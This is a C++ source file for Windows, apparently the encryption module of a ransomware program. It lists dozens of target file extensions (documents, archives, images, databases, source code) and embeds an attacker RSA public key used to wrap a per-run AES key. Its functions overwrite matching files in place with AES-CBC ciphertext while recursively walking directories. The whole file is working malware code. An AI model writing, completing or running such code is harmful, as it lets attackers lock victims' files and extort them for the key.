#include "../include/crypto.h"
#include <iomanip>

const std::vector<std::wstring> targets = {
	L".pl", 
	L".7z", 
	L".rar", 
	L".m4a", 
	L".wma", 
	L".avi", 
	L".wmv", 
	L".d3dbsp", 
	L".sc2save", 
	L".sie", 
	L".sum", 
	L".bkp", 
	L".flv", 
	L".js", 
	L".raw", 
	L".jpeg", 
	L".tar", 
	L".zip", 
	L".tar.gz", 
	L".cmd", 
	L".key", 
	L".DOT", 
	L".docm", 
	L".txt", 
	L".doc", 
	L".docx", 
	L".xls", 
	L".xlsx", 
	L".ppt", 
	L".pptx",
	L".odt", 
	L".jpg", 
	L".png", 
	L".csv", 
	L".sql", 
	L".mdb", 
	L".sln", 
	L".php", 
	L".asp", 
	L".aspx",
	L".html", 
	L".xml", 
	L".psd", 
	L".bmp", 
	L".pdf", 
	L".py", 
	L".rtf"
};

boolean gen_rand(std::vector<BYTE> &buffer) {
	NTSTATUS status = BCryptGenRandom(
		NULL, 
		buffer.data(), 
		buffer.size(), 
		BCRYPT_USE_SYSTEM_PREFERRED_RNG
	);

	return !BCRYPT_SUCCESS(status) ? false : true;
}

boolean set_algorithm(BCRYPT_ALG_HANDLE &hAlgorithm, LPCWSTR algorithm) {
	NTSTATUS status = NULL;
	

	status = BCryptOpenAlgorithmProvider(
		&hAlgorithm,
		algorithm,
		NULL,
		0
	);
	if (!BCRYPT_SUCCESS(status)) return false;

	status = BCryptSetProperty(
		hAlgorithm,
		BCRYPT_CHAINING_MODE,
		(PUCHAR)BCRYPT_CHAIN_MODE_CBC,
		sizeof(BCRYPT_CHAIN_MODE_CBC),
		0
	);

	if (!BCRYPT_SUCCESS(status)) return false;

	return true;
}

boolean rsa_encrypt(std::vector<BYTE> &key, std::vector<BYTE> &newKey) {
	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
	NTSTATUS status = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;
	const unsigned char public_key[] = {
		0x52, 0x53, 0x41, 0x31, 0x00, 0x08, 0x00, 0x00,
		0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x01, 0x00, 0x01, 0x99, 0xb8, 0x3c, 0x08, 0x9e,
		0xb7, 0x47, 0xc7, 0x74, 0x9a, 0xc6, 0x16, 0xd2,
		0x7b, 0x2b, 0x42, 0x98, 0x9f, 0xdc, 0x50, 0x95,
		0x90, 0xba, 0x2d, 0x27, 0xf0, 0x5d, 0x40, 0x7d,
		0xfb, 0xc0, 0x37, 0x5e, 0xfb, 0x77, 0x24, 0xdb,
		0x37, 0x25, 0x28, 0xc2, 0x48, 0x45, 0xea, 0x33,
		0x76, 0x04, 0xf3, 0x65, 0x28, 0x6f, 0x2e, 0xd1,
		0x87, 0x19, 0xb9, 0x5b, 0x4e, 0x76, 0x8e, 0x08,
		0xf9, 0x95, 0x4c, 0xab, 0xb6, 0x51, 0x81, 0xb7,
		0xbe, 0x80, 0xb1, 0x1c, 0x81, 0xf8, 0x1b, 0x32,
		0xf3, 0x29, 0x6a, 0x98, 0xfa, 0xb7, 0x83, 0xad,
		0x7b, 0x56, 0x1f, 0xdb, 0x85, 0x38, 0x1b, 0x9f,
		0x9e, 0xae, 0x4a, 0xa3, 0x3b, 0x05, 0x58, 0x1d,
		0x90, 0xc4, 0xdc, 0xd7, 0xd1, 0xc1, 0xec, 0x3d,
		0x23, 0x0c, 0x4b, 0x8e, 0x61, 0x24, 0xf0, 0x0f,
		0x81, 0x8f, 0x42, 0xd8, 0x0f, 0xde, 0x3b, 0x03,
		0x31, 0x67, 0x68, 0x9b, 0x94, 0xc7, 0x5d, 0xca,
		0x13, 0xc2, 0xdc, 0xf2, 0xf0, 0xa3, 0x29, 0xce,
		0x10, 0x56, 0x85, 0xfc, 0x79, 0x4b, 0xd3, 0xcd,
		0xae, 0xfb, 0x83, 0x97, 0x25, 0xe2, 0x6a, 0xda,
		0x12, 0x3f, 0x0a, 0xa2, 0x43, 0x1b, 0xae, 0x16,
		0x44, 0x97, 0xfd, 0x09, 0x9c, 0xf3, 0xad, 0xca,
		0xa3, 0xd9, 0x94, 0x2f, 0x74, 0x91, 0xb1, 0x6f,
		0xb9, 0x70, 0x06, 0x8e, 0x25, 0x92, 0x6d, 0xab,
		0x83, 0x8b, 0x8c, 0x19, 0x1a, 0x13, 0x84, 0x9e,
		0xeb, 0x20, 0x18, 0x74, 0xaf, 0xec, 0x9f, 0x09,
		0x93, 0xdc, 0xb4, 0x84, 0x9a, 0x20, 0xba, 0x92,
		0xb4, 0xc7, 0xfc, 0x7d, 0x62, 0x23, 0x2e, 0x15,
		0xb6, 0x57, 0x85, 0x3a, 0x74, 0xa4, 0xbd, 0xea,
		0xa1, 0xd4, 0x71, 0x4f, 0x29, 0xce, 0x5f, 0x0d,
		0x94, 0xa5, 0x28, 0x5a, 0x3e, 0x03, 0xb2, 0x96,
		0x10, 0x85, 0xec, 0xa9, 0xed, 0x3c, 0x86, 0xc7,
		0x6e, 0x12, 0x69
	};
	const size_t public_key_len = sizeof(public_key);

	status = BCryptOpenAlgorithmProvider(
		&hAlgorithm,
		BCRYPT_RSA_ALGORITHM,
		NULL,
		0
	);
	if (!BCRYPT_SUCCESS(status)) return false;

	status = BCryptImportKeyPair(
		hAlgorithm, 
		NULL, 
		BCRYPT_RSAPUBLIC_BLOB, 
		&hKey, 
		(PUCHAR)public_key, 
		public_key_len, 
		0
	);
	if (!BCRYPT_SUCCESS(status)) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return false;
	}
	
	DWORD encryptedSize = 0;
	status = BCryptEncrypt(
		hKey,
		key.data(),
		key.size(),
		NULL,
		NULL,
		0,
		NULL,
		0,
		&encryptedSize,
		BCRYPT_PAD_PKCS1
	);
	if (!BCRYPT_SUCCESS(status)) {
		BCryptDestroyKey(hKey);
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return false;
	}

	newKey.resize(encryptedSize);
	status = BCryptEncrypt(
		hKey,
		key.data(),
		key.size(),
		NULL,
		NULL,
		0,
		newKey.data(),
		encryptedSize,
		&encryptedSize,
		BCRYPT_PAD_PKCS1
	);
	BCryptDestroyKey(hKey);
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	if (!BCRYPT_SUCCESS(status)) {
		return false;
	}

	return true;
}

boolean aes_encrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen) { 
	NTSTATUS status = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	HANDLE hFile = CreateFileW(
		filepath, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	LARGE_INTEGER actualSize;
	if (!GetFileSizeEx(hFile, &actualSize)) {
		CloseHandle(hFile);
		return false;
	}

	std::vector<BYTE> plaintext((size_t)actualSize.QuadPart);
	DWORD bytesRead;
	if (!ReadFile(
		hFile, 
		plaintext.data(), 
		static_cast<DWORD>(plaintext.size()), 
		&bytesRead, 
		NULL)) {
		CloseHandle(hFile);
		return false;
	}

	std::vector<BYTE> keyObject(keyObjLen);
	status = BCryptGenerateSymmetricKey(
		hAlgorithm, 
		&hKey,
		keyObject.data(), 
		keyObjLen, 
		key.data(), 
		key.size(), 
		0
	);
	if (!BCRYPT_SUCCESS(status)) {
		CloseHandle(hFile);
		return false;
	}

	DWORD encryptedSize = 0;
	status = BCryptEncrypt(
		hKey, 
		plaintext.data(),
		static_cast<ULONG>(plaintext.size()), 
		NULL, 
		iv.data(), 
		iv.size(), 
		NULL, 
		0, 
		&encryptedSize, 
		BCRYPT_BLOCK_PADDING
	);
	if (!BCRYPT_SUCCESS(status)) {
		BCryptDestroyKey(hKey);
		CloseHandle(hFile);
		return false;
	}

	std::vector<BYTE> ciphertext(encryptedSize);
	status = BCryptEncrypt(
		hKey,
		plaintext.data(), 
		static_cast<ULONG>(plaintext.size()), 
		NULL, 
		iv.data(),
		iv.size(), 
		ciphertext.data(),
		encryptedSize, 
		&encryptedSize, 
		BCRYPT_BLOCK_PADDING
	);
	BCryptDestroyKey(hKey);
	if (!BCRYPT_SUCCESS(status)) {
		CloseHandle(hFile);
		return false;
	}

	DWORD bytesWritten;
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	if (!WriteFile(hFile, ciphertext.data(), encryptedSize, &bytesWritten, NULL)) {
		CloseHandle(hFile);
		return false;
	}

	SetEndOfFile(hFile);
	CloseHandle(hFile);

	return true;
}

boolean aes_decrypt(LPCWSTR filepath, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen) {
	NTSTATUS status = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	HANDLE hFile = CreateFileW(
		filepath,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	LARGE_INTEGER actualSize;
	if (!GetFileSizeEx(hFile, &actualSize)) {
		CloseHandle(hFile);
		return false;
	}

	std::vector<BYTE> ciphertext((size_t)actualSize.QuadPart);
	DWORD bytesRead;
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	if (!ReadFile(hFile, ciphertext.data(), (DWORD)ciphertext.size(), &bytesRead, NULL)) {
		CloseHandle(hFile);
		return false;
	}

	std::vector<BYTE> keyObject(keyObjLen);
	status = BCryptGenerateSymmetricKey(
		hAlgorithm,
		&hKey,
		keyObject.data(),
		keyObjLen,
		key.data(),
		(ULONG)key.size(),
		0
	);
	if (!BCRYPT_SUCCESS(status)) {
		CloseHandle(hFile);
		return false;
	}

	DWORD decryptedSize = 0;
	status = BCryptDecrypt(
		hKey,
		ciphertext.data(),
		(ULONG)ciphertext.size(),
		NULL,
		iv.data(),
		(ULONG)iv.size(),
		NULL,
		0,
		&decryptedSize,
		BCRYPT_BLOCK_PADDING
	);
	if (!BCRYPT_SUCCESS(status)) {
		BCryptDestroyKey(hKey);
		CloseHandle(hFile);
		return false;
	}

	std::vector<BYTE> plaintext(decryptedSize);
	status = BCryptDecrypt(
		hKey,
		ciphertext.data(),
		(ULONG)ciphertext.size(),
		NULL,
		iv.data(),
		(ULONG)iv.size(),
		plaintext.data(),
		decryptedSize,
		&decryptedSize,
		BCRYPT_BLOCK_PADDING
	);
	BCryptDestroyKey(hKey);
	if (!BCRYPT_SUCCESS(status)) {
		CloseHandle(hFile);
		return false;
	}

	DWORD bytesWritten;
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	if (!WriteFile(hFile, plaintext.data(), decryptedSize, &bytesWritten, NULL)) {
		CloseHandle(hFile);
		return false;
	}

	SetEndOfFile(hFile);
	CloseHandle(hFile);
	return true;
}


void traverse_dir(int dir_size, const wchar_t *dir, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen, const boolean encrypt) {
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	TCHAR szDir[MAX_PATH]; 
	size_t lenght_of_arg; 
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;
	 
	_tprintf(TEXT("\nTarget directory is %s\n\n"), dir);
	StringCchCopy(szDir, MAX_PATH, dir); 
	StringCchCat(szDir, MAX_PATH, TEXT("\\*")); 

	hFind = FindFirstFile(szDir, &ffd); 
	if (INVALID_HANDLE_VALUE == hFind) {
		return;
	}

	do {
		TCHAR filePath[MAX_PATH];
		StringCchCopy(filePath, MAX_PATH, dir);
		StringCchCat(filePath, MAX_PATH, TEXT("\\"));
		StringCchCat(filePath, MAX_PATH, ffd.cFileName);

		if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0)) {
			_tprintf(TEXT("  %s   <DIR>\n"), ffd.cFileName);
			traverse_dir(1, filePath, hAlgorithm, iv, key, keyObjLen, encrypt);
		}
		else {
			const wchar_t* ext = wcsrchr(ffd.cFileName, L'.');
			boolean process_file = false;

			if (ext) {
				for (const auto& targetExt : targets) {
					if (_wcsicmp(ext, targetExt.c_str()) == 0) {
						process_file = true;
						break;
					}
				}
			}

			if (encrypt && process_file) {
				filesize.LowPart = ffd.nFileSizeLow;
				filesize.HighPart = ffd.nFileSizeHigh;
				_tprintf(TEXT("Encrypting file: %s\n"), filePath);

				if (!aes_encrypt(filePath, hAlgorithm, iv, key, keyObjLen)) {
					_tprintf(TEXT("BAD ENCRYPTION :(\n"));
					FindClose(hFind);
					return;
				}
			}
			else if (!encrypt && process_file) {
				_tprintf(TEXT("Decrypting file: %s\n"), filePath);
				
				if (!aes_decrypt(filePath, hAlgorithm, iv, key, keyObjLen)) {
					_tprintf(TEXT("BAD DECRYPTION :(\n"));
					FindClose(hFind);
					return;
				}
			}
		} 
	} while (FindNextFile(hFind, &ffd) != 0);

	FindClose(hFind);
}